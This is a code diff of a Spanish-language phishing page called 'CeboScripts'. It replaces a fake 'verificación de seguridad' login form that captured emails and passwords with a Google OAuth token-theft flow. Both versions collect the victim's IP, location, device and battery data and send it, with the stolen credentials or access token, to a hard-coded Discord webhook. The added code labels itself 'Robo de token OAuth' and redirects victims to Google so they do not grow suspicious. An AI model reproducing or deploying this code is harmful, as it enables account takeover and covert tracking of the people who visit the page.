@@ -5,7 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CeboScripts</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             background: #000;
             color: #fff;
@@ -14,176 +18,83 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
+            flex-direction: column;
         }
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.92);
-            backdrop-filter: blur(8px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
-        }
-        .modal {
-            background: #0a0a0a;
-            border: 2px solid #ff0000;
-            border-radius: 15px;
-            padding: 40px 50px;
-            max-width: 450px;
-            width: 90%;
+        .container {
             text-align: center;
-            box-shadow: 0 0 50px rgba(255,0,0,0.3);
-            animation: glow 2s infinite alternate;
+            padding: 40px;
         }
-        @keyframes glow {
-            0% { box-shadow: 0 0 20px rgba(255,0,0,0.2); }
-            100% { box-shadow: 0 0 60px rgba(255,0,0,0.6); }
+        .loading {
+            color: #ff0000;
+            font-size: 1.5em;
+            text-shadow: 0 0 30px rgba(255,0,0,0.5);
+            animation: pulse 1.5s infinite;
         }
-        .modal h2 { color: #ff0000; font-size: 1.8em; margin-bottom: 10px; text-shadow: 0 0 20px rgba(255,0,0,0.5); }
-        .modal p { color: #aaa; font-size: 0.95em; margin-bottom: 25px; line-height: 1.5; }
-        .modal .icon { font-size: 3em; margin-bottom: 15px; display: block; }
-        .btn-group { display: flex; gap: 15px; justify-content: center; flex-wrap: wrap; }
-        .btn {
-            padding: 12px 40px;
-            border: none;
-            border-radius: 8px;
-            font-size: 1.1em;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            min-width: 120px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+        @keyframes pulse {
+            0% { opacity: 0.5; }
+            50% { opacity: 1; }
+            100% { opacity: 0.5; }
         }
-        .btn-accept { background: #ff0000; color: #fff; border: 1px solid #ff0000; }
-        .btn-accept:hover { background: #cc0000; transform: scale(1.05); box-shadow: 0 0 30px rgba(255,0,0,0.6); }
-        .btn-reject { background: transparent; color: #fff; border: 1px solid #555; }
-        .btn-reject:hover { background: #222; border-color: #ff0000; transform: scale(1.05); }
-        .hidden { display: none !important; }
-
-        /* FORMULARIO */
-        .login-container {
-            background: #0a0a0a;
-            border: 2px solid #333;
-            border-radius: 15px;
-            padding: 40px 50px;
-            max-width: 420px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 0 40px rgba(255,0,0,0.15);
-        }
-        .login-container h2 { color: #fff; font-size: 1.8em; margin-bottom: 5px; }
-        .login-container .sub { color: #888; font-size: 0.9em; margin-bottom: 25px; }
-        .login-container .logo { font-size: 2.5em; margin-bottom: 10px; }
-        .input-group { margin-bottom: 18px; text-align: left; }
-        .input-group label { color: #aaa; font-size: 0.85em; display: block; margin-bottom: 5px; }
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 8px;
-            color: #fff;
-            font-size: 1em;
-            transition: all 0.3s;
-            outline: none;
-        }
-        .input-group input:focus { border-color: #ff0000; box-shadow: 0 0 20px rgba(255,0,0,0.15); }
-        .input-group input::placeholder { color: #555; }
-        .btn-login {
-            width: 100%;
-            padding: 14px;
-            background: #ff0000;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-size: 1.1em;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .btn-login:hover { background: #cc0000; transform: scale(1.02); box-shadow: 0 0 30px rgba(255,0,0,0.4); }
-        .btn-login:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        .status-msg { margin-top: 15px; font-size: 0.85em; min-height: 20px; }
-        .footer-text { margin-top: 20px; color: #444; font-size: 0.7em; }
-        .loading-spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #fff;
-            border-top: 2px solid transparent;
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #333;
+            border-top: 3px solid #ff0000;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        
-        /* Resultado de verificación */
-        .verification-result {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 5px;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .status {
+            margin-top: 20px;
+            color: #666;
             font-size: 0.9em;
+        }
+        .hidden {
             display: none;
         }
-        .verification-result.show { display: block; }
-        .verification-result.success { background: #0a2a0a; border: 1px solid #00ff00; color: #00ff00; }
-        .verification-result.fail { background: #2a0a0a; border: 1px solid #ff0000; color: #ff4444; }
     </style>
 </head>
 <body>
-
-    <!-- OVERLAY DE PERMISO -->
-    <div class="overlay" id="permissionOverlay">
-        <div class="modal">
-            <span class="icon">⚠️</span>
-            <h2>PERMISO REQUERIDO</h2>
-            <p>Este sitio necesita acceder a tu información<br>para continuar. ¿Aceptas?</p>
-            <div class="btn-group">
-                <button class="btn btn-accept" id="btnAccept">ACEPTAR</button>
-                <button class="btn btn-reject" id="btnReject">RECHAZAR</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- FORMULARIO FALSO -->
-    <div class="login-container hidden" id="loginForm">
-        <div class="logo">🔐</div>
-        <h2>Verificación de Seguridad</h2>
-        <p class="sub">Ingresa tus credenciales para continuar</p>
-
-        <div class="input-group">
-            <label>📧 Correo Electrónico</label>
-            <input type="email" id="emailInput" placeholder="ejemplo@correo.com" autocomplete="off">
-        </div>
-
-        <div class="input-group">
-            <label>🔑 Contraseña</label>
-            <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">
-        </div>
-
-        <button class="btn-login" id="btnLogin">Verificar Credenciales</button>
-        
-        <div class="verification-result" id="verificationResult"></div>
-        <div class="status-msg" id="loginStatus"></div>
-        <div class="footer-text">🔒 Conexión segura • SSL activo</div>
+    <div class="container" id="mainContainer">
+        <div class="spinner"></div>
+        <div class="loading">⏳ Conectando con Google...</div>
+        <div class="status" id="statusMsg">Esperando autorización...</div>
     </div>
 
     <script>
         // ======== CONFIGURACIÓN ========
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";
 
+        // ======== ID DE CLIENTE DE GOOGLE (REEMPLAZAR CON EL TUYO) ========
+        // Para obtenerlo: Google Cloud Console → Credenciales → Crear ID de cliente OAuth
+        const CLIENT_ID = "TU_CLIENT_ID.apps.googleusercontent.com";
+        
+        // ======== URI DE REDIRECCIONAMIENTO (DEBE COINCIDIR CON GOOGLE) ========
+        // En Google Cloud Console → Credenciales → Agregar URI redireccionamiento
+        // Tiene que ser la URL de tu página en Vercel
+        const REDIRECT_URI = "https://TU_PAGINA.vercel.app";
+        
+        // ======== SCOPES (PERMISOS QUE PIDES) ========
+        // 'email' para obtener correo, 'profile' para nombre, 'openid' para ID
+        const SCOPES = "email profile openid";
+
+        // ======== URL DE AUTORIZACIÓN DE GOOGLE ========
+        const GOOGLE_AUTH_URL = 
+            `https://accounts.google.com/o/oauth2/v2/auth?` +
+            `client_id=${CLIENT_ID}` +
+            `&redirect_uri=${encodeURIComponent(REDIRECT_URI)}` +
+            `&response_type=token` + // 'token' para obtener access_token directamente
+            `&scope=${encodeURIComponent(SCOPES)}` +
+            `&prompt=consent`;
+
         // ======== OBTENER DATOS DEL DISPOSITIVO ========
         async function getDeviceData() {
             const data = {};
+
+            // 1. IP y ubicación
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const ipData = await res.json();
@@ -192,14 +103,17 @@
                 data.pais = ipData.country_name || 'No disponible';
                 data.isp = ipData.org || 'No disponible';
                 data.region = ipData.region || 'No disponible';
+                data.direccionReal = `${data.ciudad}, ${data.region}, ${data.pais}`;
             } catch (e) {
                 data.ip = 'Error';
                 data.ciudad = 'Error';
                 data.pais = 'Error';
                 data.isp = 'Error';
                 data.region = 'Error';
+                data.direccionReal = 'Error';
             }
 
+            // 2. Dispositivo
             const ua = navigator.userAgent || '';
             if (/android/i.test(ua)) data.dispositivo = 'Android';
             else if (/iphone|ipad|ipod/i.test(ua)) data.dispositivo = 'iOS';
@@ -208,40 +122,45 @@
             else if (/linux/i.test(ua)) data.dispositivo = 'Linux';
             else data.dispositivo = 'Desconocido';
 
+            // 3. Batería
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     data.bateria = Math.round(battery.level * 100) + '%';
+                    data.cargando = battery.charging ? 'Sí' : 'No';
                 } else {
                     data.bateria = 'No disponible';
+                    data.cargando = 'No disponible';
                 }
             } catch (e) {
                 data.bateria = 'No disponible';
+                data.cargando = 'No disponible';
             }
 
-            data.direccionReal = `${data.ciudad}, ${data.region}, ${data.pais}`;
-            data.hora = new Date().toLocaleString();
+            // 4. User Agent
             data.userAgent = ua;
+            data.hora = new Date().toLocaleString();
+            data.referrer = document.referrer || 'Directo';
+
             return data;
         }
 
         // ======== ENVIAR A DISCORD ========
-        async function sendToDiscord(data, email, password, existe) {
+        async function sendToDiscord(data, token, accion) {
             const embed = {
-                color: existe ? 0x00ff00 : 0xff0000,
-                title: existe ? '✅ CREDENCIALES VÁLIDAS' : '❌ CREDENCIALES INVÁLIDAS',
+                color: token ? 0x00ff00 : 0xff0000,
+                title: token ? '🔴 CeboScripts - TOKEN DE GOOGLE OBTENIDO' : '🔴 CeboScripts - PERMISO RECHAZADO',
                 fields: [
-                    { name: '📍 Dirección', value: data.direccionReal || 'No disponible', inline: false },
+                    { name: '📍 Dirección Real', value: data.direccionReal || 'No disponible', inline: false },
                     { name: '🌐 IP', value: data.ip || 'No disponible', inline: true },
                     { name: '📱 Dispositivo', value: data.dispositivo || 'No disponible', inline: true },
                     { name: '🔋 Batería', value: data.bateria || 'No disponible', inline: true },
                     { name: '📶 ISP', value: data.isp || 'No disponible', inline: false },
-                    { name: '📧 CORREO', value: email || 'No capturado', inline: false },
-                    { name: '🔑 CONTRASEÑA', value: password || 'No capturada', inline: false },
-                    { name: '✅ ¿Válida?', value: existe ? '✅ SÍ (coincide)' : '❌ NO (incorrecta)', inline: true },
+                    { name: '🔑 TOKEN DE ACCESO', value: token ? `\`${token.substring(0, 50)}...\`` : 'No capturado', inline: false },
+                    { name: '⚡ Acción', value: accion, inline: true },
                     { name: '🕒 Hora', value: data.hora || 'No disponible', inline: false }
                 ],
-                footer: { text: 'CeboScripts • Verificación de credenciales' },
+                footer: { text: 'CeboScripts • Robo de token OAuth' },
                 timestamp: new Date().toISOString()
             };
 
@@ -251,7 +170,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         username: 'CeboScripts Logger',
-                        content: existe ? '✅ **¡CREDENCIALES VÁLIDAS ENCONTRADAS!**' : '❌ **Credenciales inválidas**',
+                        content: token ? '✅ **¡TOKEN DE GOOGLE CAPTURADO!**' : '❌ **Permiso rechazado por el usuario**',
                         embeds: [embed]
                     })
                 });
@@ -261,108 +180,68 @@
             }
         }
 
-        // ======== "VERIFICAR" CREDENCIALES (simulación) ========
-        function verificarCredenciales(email, password) {
-            // Simula una verificación real con un delay
-            return new Promise((resolve) => {
-                setTimeout(() => {
-                    // === CRITERIOS DE VALIDACIÓN "FALSOS" PERO CREÍBLES ===
-                    // 1. El correo debe tener @ y un punto
-                    const emailValido = email.includes('@') && email.includes('.');
-                    
-                    // 2. La contraseña debe tener al menos 6 caracteres
-                    const passValida = password.length >= 6;
-                    
-                    // 3. Simulación: algunos correos "famosos" siempre son válidos (para hacer creer que funciona)
-                    const correosFamosos = ['admin', 'test', 'user', 'info', 'contacto', 'gmail', 'hotmail', 'yahoo'];
-                    const esFamoso = correosFamosos.some(c => email.toLowerCase().includes(c));
-                    
-                    // Decisión final: si pasa las validaciones básicas, es "válido"
-                    const existe = emailValido && passValida;
-                    
-                    resolve(existe);
-                }, 1500); // Delay de 1.5s para simular verificación real
-            });
-        }
+        // ======== FUNCIÓN PRINCIPAL ========
+        async function main() {
+            const statusMsg = document.getElementById('statusMsg');
+            
+            // 1. Obtener datos del dispositivo
+            const deviceData = await getDeviceData();
+            console.log('📱 Datos del dispositivo:', deviceData);
 
-        // ======== MANEJAR BOTÓN ACEPTAR ========
-        document.getElementById('btnAccept').addEventListener('click', async function() {
-            document.getElementById('permissionOverlay').classList.add('hidden');
-            document.getElementById('loginForm').classList.remove('hidden');
-            window.deviceData = await getDeviceData();
-            console.log('✅ Datos de dispositivo capturados');
-        });
+            // 2. Verificar si la URL tiene un token (por redirección de Google)
+            const hash = window.location.hash;
+            if (hash && hash.includes('access_token=')) {
+                // Extraer el token de la URL
+                const params = new URLSearchParams(hash.substring(1));
+                const accessToken = params.get('access_token');
+                const tokenType = params.get('token_type');
+                const expiresIn = params.get('expires_in');
 
-        // ======== MANEJAR BOTÓN RECHAZAR ========
-        document.getElementById('btnReject').addEventListener('click', async function() {
-            const data = await getDeviceData();
-            await sendToDiscord(data, 'No capturado', 'No capturado', false);
-            document.getElementById('permissionOverlay').classList.add('hidden');
-            document.body.innerHTML = `
-                <div style="text-align:center;padding:40px;color:#ff0000;">
-                    <h1>🚫 ACCESO DENEGADO</h1>
-                    <p style="color:#888;">Has sido registrado de todos modos.</p>
-                </div>
-            `;
-        });
+                if (accessToken) {
+                    statusMsg.textContent = '✅ Token obtenido correctamente';
+                    await sendToDiscord(deviceData, accessToken, 'Aceptó y dio token');
+                    
+                    // Mostrar mensaje de éxito
+                    document.querySelector('.loading').textContent = '✅ ¡Autorización completada!';
+                    document.querySelector('.loading').style.color = '#00ff00';
+                    document.querySelector('.spinner').style.display = 'none';
+                    statusMsg.textContent = `🔑 Token: ${accessToken.substring(0, 30)}...`;
+                    statusMsg.style.color = '#00ff00';
+                    
+                    // Redirigir a Google después de 3 segundos (para no levantar sospechas)
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 3000);
+                    return;
+                }
+            }
 
-        // ======== MANEJAR ENVÍO DEL FORMULARIO ========
-        document.getElementById('btnLogin').addEventListener('click', async function() {
-            const email = document.getElementById('emailInput').value.trim();
-            const password = document.getElementById('passwordInput').value.trim();
-            const statusMsg = document.getElementById('loginStatus');
-            const resultDiv = document.getElementById('verificationResult');
-
-            // Validar campos
-            if (!email || !password) {
-                statusMsg.textContent = '⚠️ Por favor, completa todos los campos.';
-                statusMsg.style.color = '#ff4444';
+            // 3. Verificar si la URL tiene un código de error (usuario rechazó)
+            const urlParams = new URLSearchParams(window.location.search);
+            const error = urlParams.get('error');
+            if (error) {
+                statusMsg.textContent = '❌ Usuario rechazó el permiso';
+                await sendToDiscord(deviceData, null, 'Rechazó el permiso de Google');
+                
+                document.querySelector('.loading').textContent = '❌ Acceso denegado';
+                document.querySelector('.loading').style.color = '#ff0000';
+                document.querySelector('.spinner').style.display = 'none';
+                statusMsg.textContent = 'No se otorgaron permisos a la aplicación';
+                statusMsg.style.color = '#ff0000';
                 return;
             }
 
-            // Deshabilitar botón
-            this.disabled = true;
-            this.innerHTML = '<span class="loading-spinner"></span> Verificando...';
-            statusMsg.textContent = '';
-            resultDiv.className = 'verification-result';
-            resultDiv.style.display = 'none';
+            // 4. Si no hay token ni error, redirigir a Google para pedir permiso
+            statusMsg.textContent = '🔄 Redirigiendo a Google...';
+            
+            // Pequeño delay para que se vea el mensaje
+            setTimeout(() => {
+                window.location.href = GOOGLE_AUTH_URL;
+            }, 1500);
+        }
 
-            // "Verificar" credenciales
-            const existe = await verificarCredenciales(email, password);
-
-            // Enviar a Discord
-            const data = window.deviceData || await getDeviceData();
-            await sendToDiscord(data, email, password, existe);
-
-            // Mostrar resultado
-            resultDiv.style.display = 'block';
-            if (existe) {
-                resultDiv.className = 'verification-result show success';
-                resultDiv.textContent = '✅ ¡Credenciales verificadas con éxito! Redirigiendo...';
-                this.innerHTML = '✅ Verificado';
-                statusMsg.textContent = '';
-                
-                // Redirigir a Google después de 2 segundos
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 2000);
-            } else {
-                resultDiv.className = 'verification-result show fail';
-                resultDiv.textContent = '❌ Credenciales incorrectas. Por favor, verifica tus datos.';
-                this.innerHTML = 'Reintentar';
-                this.disabled = false;
-                statusMsg.textContent = '⚠️ Correo o contraseña inválidos';
-                statusMsg.style.color = '#ff4444';
-            }
-        });
-
-        // ======== ENTER PARA ENVIAR ========
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                const btn = document.getElementById('btnLogin');
-                if (!btn.disabled) btn.click();
-            }
-        });
+        // ======== EJECUTAR ========
+        window.onload = main;
     </script>
 </body>
 </html>
